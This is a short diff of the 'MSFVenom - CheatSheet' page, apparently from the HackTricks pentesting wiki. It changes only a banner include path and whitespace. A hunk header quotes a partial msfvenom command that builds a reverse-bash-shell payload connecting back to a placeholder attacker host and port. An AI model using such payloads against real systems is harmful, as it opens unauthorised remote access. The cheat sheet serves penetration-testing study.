@@ -1,6 +1,8 @@
 # MSFVenom - CheatSheet
 
-{{#include ../../banners/hacktricks-training.md}}
+{{#include /banners/hacktricks-training.md}}
+
+
 
 ---
 
@@ -170,6 +172,5 @@ msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f
 ```
 
 {{#include ../../banners/hacktricks-training.md}}
-
 
 
